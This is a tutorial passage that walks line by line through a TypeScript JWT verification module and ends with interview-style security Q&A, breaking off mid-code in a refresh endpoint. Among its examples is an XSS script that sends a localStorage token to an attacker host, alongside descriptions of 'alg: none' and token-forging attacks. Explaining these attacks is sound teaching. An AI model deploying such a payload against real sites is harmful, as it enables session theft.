# M05: JWT Authentication Deep Dive - PART 3

**File:** `shared/auth/jwt.ts` (157 lines)  
**Level:** Security  
**Prerequisites:** M05 Part 1, M05 Part 2  
**Time to Master:** 3-4 hours

---

## 🔍 SECTION 5: LINE-BY-LINE CODE ANALYSIS (Part 3 - Token Verification)

### 5.1 verifyAccessToken Function (Lines 88-100)

```typescript
export const verifyAccessToken = (token: string): TokenPayload & { jti: string; tokenType: string } => {
  try {
    const decoded = jwt.verify(token, JWT_SECRET) as TokenPayload & { jti: string; tokenType: string };
    if (decoded.tokenType !== 'access') {
      throw new UnauthorizedError('Invalid token type');
    }
    return decoded;
  } catch (error: any) {
    if (error.name === 'TokenExpiredError') throw new UnauthorizedError('Token expired');
    if (error.name === 'JsonWebTokenError') throw new UnauthorizedError('Invalid token');
    throw new UnauthorizedError('Token verification failed');
  }
};
```

This function **verifies and decodes** access tokens.

#### Line 88: Return Type

```typescript
export const verifyAccessToken = (token: string): TokenPayload & { jti: string; tokenType: string }
```

**Return type breakdown:**

```typescript
TokenPayload & { jti: string; tokenType: string }
```

**Intersection type (`&`):**

Combines two types:

```typescript
// TokenPayload (from interface)
{
  userId: number;
  email: string;
  role: string;
  jti?: string;      // Optional
  tokenType?: string; // Optional
}

// & { jti: string; tokenType: string }
// Makes jti and tokenType REQUIRED

// Result type:
{
  userId: number;
  email: string;
  role: string;
  jti: string;       // Required now!
  tokenType: string; // Required now!
}
```

**Why make jti and tokenType required in return?**

They're optional in the interface (might not be provided when generating), but **always present** after verification:

```typescript
// When generating token:
const payload: TokenPayload = {
  userId: 123,
  email: 'john@example.com',
  role: 'user'
  // jti and tokenType added by generateAccessToken()
};

// After verification:
const decoded = verifyAccessToken(token);
decoded.jti       // ✅ Always exists
decoded.tokenType // ✅ Always exists
```

#### Lines 89-90: jwt.verify()

```typescript
try {
  const decoded = jwt.verify(token, JWT_SECRET) as TokenPayload & { jti: string; tokenType: string };
```

**What jwt.verify() does:**

```typescript
jwt.verify(token, secret)
```

1. **Decode** token (extract header, payload, signature)
2. **Verify signature** using secret
3. **Check expiration** (exp claim)
4. **Check issuer** (if specified)
5. **Return payload** if all checks pass

**Example verification:**

```typescript
const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...';

// Step 1: Split token
const [headerB64, payloadB64, signatureB64] = token.split('.');

// Step 2: Verify signature
const expectedSignature = HMACSHA256(
  headerB64 + '.' + payloadB64,
  JWT_SECRET
);

if (signatureB64 !== expectedSignature) {
  throw new JsonWebTokenError('Invalid signature');
}

// Step 3: Check expiration
const payload = JSON.parse(base64Decode(payloadB64));
if (payload.exp < Date.now() / 1000) {
  throw new TokenExpiredError('Token expired');
}

// Step 4: Return payload
return payload;
```

**Type assertion (`as`):**

```typescript
as TokenPayload & { jti: string; tokenType: string }
```

Tells TypeScript what type to expect:

```typescript
// Without type assertion:
const decoded = jwt.verify(token, JWT_SECRET);
// Type: string | JwtPayload (generic)

// With type assertion:
const decoded = jwt.verify(token, JWT_SECRET) as TokenPayload;
// Type: TokenPayload (specific)
```

#### Lines 91-93: Token Type Check

```typescript
if (decoded.tokenType !== 'access') {
  throw new UnauthorizedError('Invalid token type');
}
```

**Critical security check!**

Prevents **token confusion attacks**:

```typescript
// Scenario: User has refresh token
const refreshToken = 'eyJ...';  // { tokenType: 'refresh', exp: 7 days }

// Attacker tries to use it as access token
GET /api/users/profile
Authorization: Bearer eyJ...  // Refresh token!

// Without token type check:
const decoded = jwt.verify(refreshToken, JWT_SECRET);
// ✅ Valid signature, not expired (7 days!)
// ❌ Attacker gets 7-day access token!

// With token type check:
if (decoded.tokenType !== 'access') {
  throw new UnauthorizedError('Invalid token type');
}
// ✅ Rejected! Wrong token type
```

**Why this matters:**

| Token Type | Expiry | If Used as Access Token |
|------------|--------|-------------------------|
| Access | 15 min | ✅ Correct (short window) |
| Refresh | 7 days | ❌ Dangerous (long window) |
| Service | 1 hour | ❌ Wrong context |

**Real attack example:**

```typescript
// 1. User logs in
POST /auth/login
Response: {
  accessToken: "eyJ...",   // 15 min
  refreshToken: "eyJ..."   // 7 days
}

// 2. Access token expires after 15 min
// 3. Attacker tries refresh token on API

// WITHOUT tokenType check:
GET /api/admin/users
Authorization: Bearer <refreshToken>
// ✅ Works! Attacker has 7-day admin access

// WITH tokenType check:
GET /api/admin/users
Authorization: Bearer <refreshToken>
// ❌ 401 Unauthorized: "Invalid token type"
```

#### Lines 95-99: Error Handling

```typescript
} catch (error: any) {
  if (error.name === 'TokenExpiredError') throw new UnauthorizedError('Token expired');
  if (error.name === 'JsonWebTokenError') throw new UnauthorizedError('Invalid token');
  throw new UnauthorizedError('Token verification failed');
}
```

**Why catch and re-throw?**

1. **Normalize errors** - All JWT errors become UnauthorizedError
2. **Hide implementation details** - Don't expose "jsonwebtoken" library errors
3. **Consistent error handling** - Same error class throughout app

**Error types from jsonwebtoken:**

```typescript
// TokenExpiredError
error.name = 'TokenExpiredError'
error.expiredAt = 1639017700
// Thrown when: Current time > exp claim

// JsonWebTokenError
error.name = 'JsonWebTokenError'
// Thrown when:
// - Invalid signature
// - Malformed token
// - Missing required claims

// NotBeforeError
error.name = 'NotBeforeError'
// Thrown when: nbf (not before) claim in future
```

**Line 96: TokenExpiredError**

```typescript
if (error.name === 'TokenExpiredError') throw new UnauthorizedError('Token expired');
```

**Most common error** - access token expires after 15 minutes.

**Client handling:**

```typescript
async function apiRequest(endpoint: string) {
  try {
    const response = await fetch(endpoint, {
      headers: {
        Authorization: `Bearer ${accessToken}`
      }
    });
    return response.json();
  } catch (error) {
    if (error.message === 'Token expired') {
      // Refresh token and retry
      const newAccessToken = await refreshAccessToken();
      return apiRequest(endpoint); // Retry with new token
    }
    throw error;
  }
}
```

**Line 97: JsonWebTokenError**

```typescript
if (error.name === 'JsonWebTokenError') throw new UnauthorizedError('Invalid token');
```

**Covers multiple failure cases:**

```typescript
// 1. Invalid signature (tampered token)
const fakeToken = token.replace(/.$/, '0'); // Change last char
jwt.verify(fakeToken, JWT_SECRET);
// → JsonWebTokenError: invalid signature

// 2. Malformed token
jwt.verify('not.a.valid.token', JWT_SECRET);
// → JsonWebTokenError: jwt malformed

// 3. Wrong secret
jwt.verify(token, 'wrong_secret');
// → JsonWebTokenError: invalid signature
```

**Line 98: Catch-all**

```typescript
throw new UnauthorizedError('Token verification failed');
```

Any other error (network, database, etc.) becomes generic "verification failed".

**Why generic message?**

**Security:** Don't leak internal errors:

```typescript
// ❌ BAD: Exposes internals
throw new Error(`Database error: ${dbError.message}`);
// Attacker learns: "Oh, they're checking token against database"

// ✅ GOOD: Generic message
throw new UnauthorizedError('Token verification failed');
// Attacker learns: Nothing useful
```

### 5.2 verifyRefreshToken Function (Lines 102-114)

```typescript
export const verifyRefreshToken = (token: string): RefreshTokenPayload & { jti: string; tokenType: string } => {
  try {
    const decoded = jwt.verify(token, JWT_REFRESH_SECRET) as RefreshTokenPayload & { jti: string; tokenType: string };
    if (decoded.tokenType !== 'refresh') {
      throw new UnauthorizedError('Invalid token type');
    }
    return decoded;
  } catch (error: any) {
    if (error.name === 'TokenExpiredError') throw new UnauthorizedError('Refresh token expired');
    if (error.name === 'JsonWebTokenError') throw new UnauthorizedError('Invalid refresh token');
    throw new UnauthorizedError('Refresh token verification failed');
  }
};
```

Almost identical to `verifyAccessToken`, with two key differences:

#### Difference 1: Different Secret (Line 104)

```typescript
const decoded = jwt.verify(token, JWT_REFRESH_SECRET)
```

**Why JWT_REFRESH_SECRET instead of JWT_SECRET?**

**Security isolation:**

```typescript
// Scenario: Access token secret leaked
JWT_SECRET = 'exposed_secret'

// Attacker forges access token:
const fakeAccessToken = jwt.sign(
  { userId: 1, role: 'admin' },
  'exposed_secret'  // ← Attacker knows this!
);
// Server accepts fake access token ❌

// BUT: Attacker CANNOT forge refresh tokens
const fakeRefreshToken = jwt.sign(
  { userId: 1 },
  'exposed_secret'  // ← Wrong secret!
);
// Server rejects (verifies with JWT_REFRESH_SECRET) ✅
```

**Two-layer defense:**

```
┌─────────────────────────────────────────┐
│ Layer 1: Access Tokens (JWT_SECRET)    │
│ - If compromised: 15-min exposure      │
│ - Rotate secret → All access tokens    │
│   invalid, but users stay logged in    │
└─────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────┐
│ Layer 2: Refresh Tokens                │
│         (JWT_REFRESH_SECRET)            │
│ - If compromised: Rotate different      │
│   secret, force re-login               │
└─────────────────────────────────────────┘
```

#### Difference 2: Different Return Type (Line 102)

```typescript
export const verifyRefreshToken = (token: string): RefreshTokenPayload & { jti: string; tokenType: string }
```

**RefreshTokenPayload vs TokenPayload:**

```typescript
// Access token payload (full data)
{
  userId: number;
  email: string;
  role: string;
  jti: string;
  tokenType: 'access';
}

// Refresh token payload (minimal)
{
  userId: number;   // Only userId!
  jti: string;
  tokenType: 'refresh';
}
```

**Why minimal data in refresh token?**

```typescript
// Use case: Refresh access token
async function refreshAccessToken(refreshToken: string) {
  // 1. Verify refresh token
  const decoded = verifyRefreshToken(refreshToken);
  // Only has: userId, jti, tokenType
  
  // 2. Fetch latest user data from database
  const user = await db.query('SELECT * FROM users WHERE id = $1', [decoded.userId]);
  
  // 3. Generate new access token with fresh data
  return generateAccessToken({
    userId: user.id,
    email: user.email,    // Fresh from DB
    role: user.role       // Fresh from DB (might have changed!)
  });
}
```

**Benefit: Always fresh data in access token**

```typescript
// Timeline:
// 10:00 AM - User logs in as 'user'
// 10:10 AM - Admin promotes user to 'admin' in database
// 10:15 AM - Access token expires
// 10:15 AM - Client uses refresh token

// Without database query:
// New access token: { role: 'user' } ❌ Stale!

// With database query:
// New access token: { role: 'admin' } ✅ Fresh!
```

### 5.3 verifyServiceToken Function (Lines 116-128)

```typescript
export const verifyServiceToken = (token: string): ServiceTokenPayload & { jti: string; tokenType: string } => {
  try {
    const decoded = jwt.verify(token, JWT_SECRET) as ServiceTokenPayload & { jti: string; tokenType: string };
    if (decoded.tokenType !== 'service') {
      throw new UnauthorizedError('Invalid token type - service token required');
    }
    return decoded;
  } catch (error: any) {
    if (error.name === 'TokenExpiredError') throw new UnauthorizedError('Service token expired');
    if (error.name === 'JsonWebTokenError') throw new UnauthorizedError('Invalid service token');
    throw new UnauthorizedError('Service token verification failed');
  }
};
```

Verifies **service-to-service** tokens.

#### Line 118: Same Secret as Access Tokens

```typescript
const decoded = jwt.verify(token, JWT_SECRET)
```

**Why JWT_SECRET, not JWT_SERVICE_SECRET?**

**Simplicity** - Same secret for both user and service tokens:

```typescript
// Middleware can verify both token types
function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  
  try {
    // Use same secret for both
    const decoded = jwt.verify(token, JWT_SECRET);
    
    if (decoded.tokenType === 'access') {
      req.user = decoded;
    } else if (decoded.tokenType === 'service') {
      req.service = decoded;
    }
    
    next();
  } catch (err) {
    res.status(401).json({ error: 'Unauthorized' });
  }
}
```

**Alternative: Separate secret (more secure)**

```typescript
// Generate with separate secret
const serviceToken = jwt.sign(
  payload,
  JWT_SERVICE_SECRET  // Different secret
);

// Verify with separate secret
const decoded = jwt.verify(token, JWT_SERVICE_SECRET);
```

**Trade-off:**

| Approach | Pros | Cons |
|----------|------|------|
| Same secret | Simple, one secret to manage | Less isolation if compromised |
| Separate secret | Better security isolation | More secrets to rotate |

#### Line 119: ServiceTokenPayload Return Type

```typescript
: ServiceTokenPayload & { jti: string; tokenType: string }
```

**ServiceTokenPayload structure:**

```typescript
{
  serviceId: string;       // 'user-service'
  permissions: string[];   // ['read:orders', 'create:orders']
  jti: string;
  tokenType: 'service';
}
```

**Using service token in API:**

```typescript
// Order Service endpoint
app.get('/api/orders', authenticate, authorize(['read:orders']), async (req, res) => {
  // req.service = { serviceId: 'user-service', permissions: [...] }
  
  const orders = await db.query('SELECT * FROM orders');
  res.json(orders);
});

// Authorize middleware
function authorize(requiredPermissions: string[]) {
  return (req, res, next) => {
    if (!req.service) {
      return res.status(401).json({ error: 'Service token required' });
    }
    
    const hasPermission = requiredPermissions.every(perm =>
      req.service.permissions.includes(perm)
    );
    
    if (!hasPermission) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    
    next();
  };
}
```

### 5.4 generateTokenPair Function (Lines 130-136)

```typescript
export const generateTokenPair = (user: UserForToken): { accessToken: string; refreshToken: string } => {
  const payload = { userId: user.id, email: user.email, role: user.role };
  return {
    accessToken: generateAccessToken(payload),
    refreshToken: generateRefreshToken({ userId: user.id })
  };
};
```

**Convenience function** - generates both tokens at once.

#### Line 130: UserForToken Input

```typescript
(user: UserForToken)
```

**UserForToken interface:**

```typescript
interface UserForToken {
  id: number;
  email: string;
  role: string;
}
```

**Why separate interface?**

Type safety - ensures correct data passed:

```typescript
// ✅ Correct
const user = await db.query('SELECT id, email, role FROM users WHERE id = $1', [123]);
const tokens = generateTokenPair(user);

// ❌ TypeScript error - missing fields
const user = { id: 123 };
const tokens = generateTokenPair(user);
```

#### Line 131: Payload Construction

```typescript
const payload = { userId: user.id, email: user.email, role: user.role };
```

**Why create new object?**

**1. Rename `id` to `userId`:**

```typescript
// Database returns: { id: 123 }
// Token needs: { userId: 123 }

// Mapping:
userId: user.id  // id → userId
```

**2. Only include necessary fields:**

```typescript
// Database might return:
{
  id: 123,
  email: 'john@example.com',
  role: 'user',
  passwordHash: '$2b$10$...',  // Don't include!
  createdAt: '2023-01-01',     // Don't include!
  updatedAt: '2023-01-15'      // Don't include!
}

// Payload only includes:
{
  userId: 123,
  email: 'john@example.com',
  role: 'user'
}
```

#### Lines 132-135: Return Both Tokens

```typescript
return {
  accessToken: generateAccessToken(payload),
  refreshToken: generateRefreshToken({ userId: user.id })
};
```

**Note the difference:**

```typescript
// Access token: Full data
generateAccessToken({
  userId: user.id,
  email: user.email,
  role: user.role
})

// Refresh token: Only userId
generateRefreshToken({
  userId: user.id
})
```

**Usage in login endpoint:**

```typescript
app.post('/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  // 1. Validate credentials
  const user = await db.query('SELECT * FROM users WHERE email = $1', [email]);
  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // 2. Generate token pair
  const { accessToken, refreshToken } = generateTokenPair(user);
  
  // 3. Return tokens
  res.json({
    accessToken,
    refreshToken,
    expiresIn: 900  // 15 minutes in seconds
  });
});
```

### 5.5 Utility Functions (Lines 138-156)

#### decodeTokenUnsafe (Lines 138-144)

```typescript
export const decodeTokenUnsafe = (token: string): jwt.JwtPayload | null => {
  try {
    return jwt.decode(token) as jwt.JwtPayload;
  } catch {
    return null;
  }
};
```

**What "unsafe" means:**

```typescript
// jwt.decode() - Does NOT verify signature!
const decoded = jwt.decode(token);

// vs

// jwt.verify() - DOES verify signature
const decoded = jwt.verify(token, JWT_SECRET);
```

**When to use decodeTokenUnsafe:**

```typescript
// ✅ GOOD: Check expiry before making request
const expiry = getTokenExpiry(accessToken);
if (expiry < Date.now() / 1000) {
  // Token expired, refresh it first
  await refreshAccessToken();
}

// ✅ GOOD: Get userId for logging (non-security)
const decoded = decodeTokenUnsafe(token);
logger.info('Request from user', { userId: decoded?.userId });

// ❌ BAD: Use for authentication
const decoded = decodeTokenUnsafe(token);
if (decoded?.role === 'admin') {
  // VULNERABLE! No signature verification!
  allowAdminAccess();
}
```

**Why it returns `null` on error:**

```typescript
try {
  return jwt.decode(token) as jwt.JwtPayload;
} catch {
  return null;  // Invalid token format
}

// Usage:
const decoded = decodeTokenUnsafe(token);
if (decoded) {
  // Use decoded data
} else {
  // Invalid token
}
```

#### getTokenExpiry (Lines 146-149)

```typescript
export const getTokenExpiry = (token: string): number | null => {
  const decoded = decodeTokenUnsafe(token);
  return decoded?.exp || null;
};
```

**Returns expiration timestamp:**

```typescript
const expiry = getTokenExpiry(accessToken);
// Returns: 1639017700 (Unix timestamp)

// Convert to Date:
const expiryDate = new Date(expiry * 1000);
// Returns: 2021-12-09T12:15:00.000Z
```

**Optional chaining (`?.`):**

```typescript
decoded?.exp
```

If `decoded` is null, returns `undefined` instead of throwing error:

```typescript
// Without optional chaining:
const exp = decoded.exp;  // ❌ Error if decoded is null

// With optional chaining:
const exp = decoded?.exp;  // ✅ Returns undefined if decoded is null
```

**`|| null` fallback:**

```typescript
decoded?.exp || null
```

If `exp` is `undefined`, return `null`:

```typescript
decoded = { userId: 123 }  // No exp field
decoded?.exp  // Returns: undefined
decoded?.exp || null  // Returns: null
```

**Use case: Proactive token refresh**

```typescript
// Client-side refresh logic
setInterval(() => {
  const expiry = getTokenExpiry(accessToken);
  const now = Date.now() / 1000;
  const timeLeft = expiry - now;
  
  // Refresh if less than 2 minutes left
  if (timeLeft < 120) {
    refreshAccessToken();
  }
}, 60000);  // Check every minute
```

#### getTokenTTL (Lines 151-156)

```typescript
export const getTokenTTL = (token: string): number => {
  const expiry = getTokenExpiry(token);
  if (!expiry) return 0;
  const now = Math.floor(Date.now() / 1000);
  return Math.max(0, expiry - now);
};
```

**TTL = Time To Live**

Returns seconds until token expires.

**Line 152: Get expiry**

```typescript
const expiry = getTokenExpiry(token);
```

Gets expiration timestamp (or `null`).

**Line 153: Null check**

```typescript
if (!expiry) return 0;
```

If no expiry, token is invalid → TTL is 0.

**Line 154: Current timestamp**

```typescript
const now = Math.floor(Date.now() / 1000);
```

**Why `Math.floor`?**

```typescript
Date.now()  // Returns: 1639017650123 (milliseconds)
Date.now() / 1000  // Returns: 1639017650.123 (seconds with decimals)
Math.floor(Date.now() / 1000)  // Returns: 1639017650 (seconds, integer)
```

JWT `exp` claim is **integer seconds**, so we need integer for comparison.

**Line 155: Calculate TTL**

```typescript
return Math.max(0, expiry - now);
```

**Math.max(0, ...)** prevents negative TTL:

```typescript
// Token expired 5 minutes ago
expiry = 1639017400
now = 1639017700
expiry - now = -300  // Negative!

// Without Math.max:
return -300  // ❌ Negative TTL

// With Math.max:
return Math.max(0, -300)  // ✅ Returns 0
```

**Use case: Display countdown**

```typescript
// UI component
function TokenExpiry() {
  const [ttl, setTTL] = useState(0);
  
  useEffect(() => {
    const interval = setInterval(() => {
      setTTL(getTokenTTL(accessToken));
    }, 1000);  // Update every second
    
    return () => clearInterval(interval);
  }, [accessToken]);
  
  const minutes = Math.floor(ttl / 60);
  const seconds = ttl % 60;
  
  return (
    <div>
      Token expires in: {minutes}:{seconds.toString().padStart(2, '0')}
    </div>
  );
}
```

---

## 🏗️ SECTION 6: AUTHENTICATION ARCHITECTURE

### 6.1 Full Authentication Flow

```
┌──────────────────────────────────────────────────────────────────┐
│                    COMPLETE AUTH FLOW                            │
└──────────────────────────────────────────────────────────────────┘

┌─────────┐                                           ┌──────────┐
│ Client  │                                           │  Server  │
└────┬────┘                                           └────┬─────┘
     │                                                      │
     │ 1. POST /auth/login                                │
     │    { email, password }                             │
     ├───────────────────────────────────────────────────>│
     │                                                     │
     │                                   2. Validate credentials
     │                                      ┌──────────────▼─────┐
     │                                      │ db.query(          │
     │                                      │   'SELECT * FROM   │
     │                                      │    users WHERE...' │
     │                                      │ )                  │
     │                                      └──────────────┬─────┘
     │                                                     │
     │                                   3. Generate tokens
     │                                      ┌──────────────▼─────┐
     │                                      │ generateTokenPair( │
     │                                      │   user             │
     │                                      │ )                  │
     │                                      └──────────────┬─────┘
     │                                                     │
     │ 4. Receive tokens                                  │
     │    { accessToken, refreshToken }                   │
     │<───────────────────────────────────────────────────┤
     │                                                     │
     │ 5. Store tokens                                    │
     │    - accessToken in memory                         │
     │    - refreshToken in httpOnly cookie              │
     │                                                     │
     │ 6. API Request                                     │
     │    GET /api/users/profile                          │
     │    Authorization: Bearer <accessToken>             │
     ├───────────────────────────────────────────────────>│
     │                                                     │
     │                                   7. Verify token
     │                                      ┌──────────────▼─────┐
     │                                      │ verifyAccessToken( │
     │                                      │   token            │
     │                                      │ )                  │
     │                                      └──────────────┬─────┘
     │                                                     │
     │                                   8. Check blacklist (optional)
     │                                      ┌──────────────▼─────┐
     │                                      │ redis.exists(      │
     │                                      │   `blacklist:${jti}`│
     │                                      │ )                  │
     │                                      └──────────────┬─────┘
     │                                                     │
     │ 9. Success response                                │
     │    { id: 123, email: '...', role: 'user' }        │
     │<───────────────────────────────────────────────────┤
     │                                                     │
     │                                                     │
     │ ⏰ 15 minutes later...                             │
     │                                                     │
     │ 10. API Request (token expired)                    │
     │     Authorization: Bearer <expiredToken>           │
     ├───────────────────────────────────────────────────>│
     │                                                     │
     │                                  11. Verify fails (expired)
     │                                      ┌──────────────▼─────┐
     │                                      │ TokenExpiredError  │
     │                                      └──────────────┬─────┘
     │                                                     │
     │ 12. Error: Token expired                           │
     │<───────────────────────────────────────────────────┤
     │                                                     │
     │ 13. Refresh request                                │
     │     POST /auth/refresh                             │
     │     { refreshToken }                               │
     ├───────────────────────────────────────────────────>│
     │                                                     │
     │                                  14. Verify refresh token
     │                                      ┌──────────────▼─────┐
     │                                      │verifyRefreshToken( │
     │                                      │  token             │
     │                                      │)                   │
     │                                      └──────────────┬─────┘
     │                                                     │
     │                                  15. Get fresh user data
     │                                      ┌──────────────▼─────┐
     │                                      │ db.query(          │
     │                                      │   'SELECT * FROM   │
     │                                      │    users WHERE...' │
     │                                      │ )                  │
     │                                      └──────────────┬─────┘
     │                                                     │
     │                                  16. Generate new access token
     │                                      ┌──────────────▼─────┐
     │                                      │generateAccessToken(│
     │                                      │  freshUserData     │
     │                                      │)                   │
     │                                      └──────────────┬─────┘
     │                                                     │
     │ 17. New access token                               │
     │     { accessToken }                                │
     │<───────────────────────────────────────────────────┤
     │                                                     │
     │ 18. Retry original request                         │
     │     Authorization: Bearer <newAccessToken>         │
     ├───────────────────────────────────────────────────>│
     │                                                     │
     │ 19. Success! ✅                                     │
     │<───────────────────────────────────────────────────┤
     │                                                     │
```

### 6.2 Service-to-Service Authentication

```
┌──────────────────────────────────────────────────────────────────┐
│              SERVICE-TO-SERVICE AUTH FLOW                        │
└──────────────────────────────────────────────────────────────────┘

┌──────────────┐                                    ┌──────────────┐
│ User Service │                                    │Order Service │
└──────┬───────┘                                    └──────┬───────┘
       │                                                   │
       │ 1. Need to fetch user's orders                   │
       │                                                   │
       │ 2. Generate service token                        │
       │    ┌────────────────────────────┐                │
       │    │ generateServiceToken({     │                │
       │    │   serviceId: 'user-svc',   │                │
       │    │   permissions: [           │                │
       │    │     'read:orders'           │                │
       │    │   ]                         │                │
       │    │ })                          │                │
       │    └─────────────┬──────────────┘                │
       │                  │                                │
       │ 3. Make request with service token               │
       │    GET /api/orders?userId=123                    │
       │    Authorization: Bearer <serviceToken>          │
       ├─────────────────────────────────────────────────>│
       │                                                   │
       │                              4. Verify service token
       │                                 ┌─────────────────▼────┐
       │                                 │ verifyServiceToken(  │
       │                                 │   token              │
       │                                 │ )                    │
       │                                 └─────────────────┬────┘
       │                                                   │
       │                              5. Check permissions
       │                                 ┌─────────────────▼────┐
       │                                 │ if (!decoded.        │
       │                                 │   permissions.       │
       │                                 │   includes(          │
       │                                 │     'read:orders'    │
       │                                 │   )) throw error     │
       │                                 └─────────────────┬────┘
       │                                                   │
       │                              6. Fetch orders
       │                                 ┌─────────────────▼────┐
       │                                 │ db.query(            │
       │                                 │   'SELECT * FROM     │
       │                                 │    orders WHERE...'  │
       │                                 │ )                    │
       │                                 └─────────────────┬────┘
       │                                                   │
       │ 7. Return orders                                 │
       │    [{ id: 1, total: 99.99, ... }]               │
       │<─────────────────────────────────────────────────┤
       │                                                   │
```

---

## 🎯 SECTION 7: MAANG INTERVIEW QUESTIONS

### Q1: Explain JWT authentication and how it differs from session-based auth

**Answer:**

**JWT (JSON Web Token) Authentication:**
- Client receives token after login
- Token is **self-contained** (has user data)
- Client sends token with each request
- Server **verifies signature** (no DB lookup)
- **Stateless** - server doesn't store sessions

**Session-based Authentication:**
- Server creates session after login
- Session ID stored in database
- Client receives session ID (in cookie)
- Client sends session ID with each request
- Server looks up session in database
- **Stateful** - server stores all sessions

**Comparison:**

| Feature | JWT | Session |
|---------|-----|---------|
| **Server state** | Stateless | Stateful |
| **Scalability** | Easy (no shared state) | Hard (need shared session store) |
| **DB lookup per request** | No | Yes |
| **Revocation** | Hard (need blacklist) | Easy (delete from DB) |
| **Token size** | Large (contains data) | Small (just ID) |
| **Best for** | Microservices, APIs | Monolithic apps |

**Follow-up: When would you use each?**

**Use JWT when:**
- Microservices architecture
- Horizontal scaling required
- Mobile apps
- Third-party API access

**Use sessions when:**
- Monolithic application
- Need instant revocation
- Simple authentication requirements

### Q2: How do you handle JWT token revocation?

**Answer:**

JWT tokens are **stateless**, so revocation is challenging. Three approaches:

**1. Token Blacklist (Redis)**

```typescript
// When user logs out
async function logout(token: string) {
  const decoded = verifyAccessToken(token);
  const ttl = getTokenTTL(token);
  
  // Blacklist token for remaining lifetime
  await redis.set(`blacklist:${decoded.jti}`, '1', ttl);
}

// Check blacklist on every request
async function verifyToken(token: string) {
  const decoded = verifyAccessToken(token);
  
  // Check if blacklisted
  const isBlacklisted = await redis.exists(`blacklist:${decoded.jti}`);
  if (isBlacklisted) {
    throw new UnauthorizedError('Token has been revoked');
  }
  
  return decoded;
}
```

**Pros:**
- Works immediately
- Can revoke individual tokens

**Cons:**
- Requires database lookup (loses stateless benefit)
- Must maintain blacklist

**2. Short Expiration + Refresh Tokens**

```typescript
// Access token: 15 minutes
// Refresh token: 7 days

// If compromised:
// - Access token: Only 15 min window
// - Refresh token: Blacklist it (smaller list)
```

**Pros:**
- Limited exposure window
- Smaller blacklist (only refresh tokens)

**Cons:**
- Can't revoke immediately (up to 15 min delay)

**3. Token Versioning**

```typescript
// Store token version in database
interface User {
  id: number;
  tokenVersion: number;  // Increment on logout/password change
}

// Include version in token
const token = generateAccessToken({
  userId: user.id,
  tokenVersion: user.tokenVersion
});

// Verify version matches
async function verifyToken(token: string) {
  const decoded = verifyAccessToken(token);
  const user = await db.query('SELECT tokenVersion FROM users WHERE id = $1', [decoded.userId]);
  
  if (decoded.tokenVersion !== user.tokenVersion) {
    throw new UnauthorizedError('Token revoked');
  }
  
  return decoded;
}

// Revoke all tokens
await db.query('UPDATE users SET tokenVersion = tokenVersion + 1 WHERE id = $1', [userId]);
```

**Pros:**
- Revokes ALL user's tokens at once
- Simple version number

**Cons:**
- Requires database lookup
- Can't revoke individual tokens

**Best practice: Combine approaches**

```typescript
// 1. Short-lived access tokens (15 min)
// 2. Blacklist refresh tokens on logout
// 3. Token versioning for password changes
```

### Q3: What security vulnerabilities exist with JWT and how do you prevent them?

**Answer:**

**1. Weak Secret**

**Vulnerability:**
```typescript
const JWT_SECRET = 'secret123';  // ❌ Easy to guess
```

**Attack:**
Attacker brute-forces secret, forges tokens.

**Prevention:**
```typescript
// Generate strong secret (64 bytes)
const JWT_SECRET = crypto.randomBytes(64).toString('hex');

// Store in environment variable
process.env.JWT_SECRET = '...'
```

**2. Algorithm Confusion Attack**

**Vulnerability:**
```typescript
// Attacker changes header
{ "alg": "none" }  // ← No signature!

// Or changes symmetric to asymmetric
{ "alg": "RS256" }  // ← Uses public key as secret
```

**Prevention:**
```typescript
// Always specify allowed algorithms
jwt.verify(token, secret, { algorithms: ['HS256'] });
```

**3. Storing in localStorage (XSS)**

**Vulnerability:**
```typescript
localStorage.setItem('token', accessToken);  // ❌ Vulnerable to XSS
```

**Attack:**
```typescript
// XSS payload
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('token')
  });
</script>
```

**Prevention:**
```typescript
// Option 1: Memory only (lost on refresh)
let accessToken = null;

// Option 2: HttpOnly cookie (JS can't access)
res.cookie('token', accessToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});
```

**4. No Token Type Check**

**Vulnerability:**
```typescript
// Accept any token type
jwt.verify(token, JWT_SECRET);
```

**Attack:**
Use refresh token (7 days) as access token.

**Prevention:**
```typescript
const decoded = jwt.verify(token, JWT_SECRET);
if (decoded.tokenType !== 'access') {
  throw new Error('Invalid token type');
}
```

**5. No Expiration**

**Vulnerability:**
```typescript
jwt.sign(payload, secret);  // ❌ Never expires
```

**Attack:**
Stolen token valid forever.

**Prevention:**
```typescript
jwt.sign(payload, secret, { expiresIn: '15m' });
```

**6. Sensitive Data in Payload**

**Vulnerability:**
```typescript
// Token payload (Base64 encoded, NOT encrypted!)
{
  userId: 123,
  password: 'secret123',  // ❌ Anyone can decode!
  ssn: '123-45-6789'     // ❌ Visible to anyone!
}
```

**Prevention:**
```typescript
// Only include non-sensitive data
{
  userId: 123,
  email: 'john@example.com',
  role: 'user'
}
```

### Q4: Design a token refresh mechanism

**Answer:**

**Architecture:**

```typescript
// 1. Token structure
interface Tokens {
  accessToken: string;   // 15 min, full user data
  refreshToken: string;  // 7 days, only userId
}

// 2. Login endpoint
app.post('/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Validate credentials
  const user = await db.query('SELECT * FROM users WHERE email = $1', [email]);
  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Generate token pair
  const tokens = generateTokenPair(user);
  
  // Store refresh token hash in database
  const refreshTokenHash = await bcrypt.hash(tokens.refreshToken, 10);
  await db.query(
    'INSERT INTO refresh_tokens (user_id, token_hash) VALUES ($1, $2)',
    [user.id, refreshTokenHash]
  );
  
  res.json(tokens);
});

// 3. Protected endpoint
app.get('/api/users/profile', authenticate, async (req, res) => {
  // authenticate middleware verifies access token
  res.json(req.user);
});

// 4. Refresh endpoint
app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  
  try {
    // Verify refresh token
    const decoded = verifyRefreshToken(refreshToken);
    
    // Check token exists in database
    const tokenHash = await bcrypt.hash(refreshToken, 10);
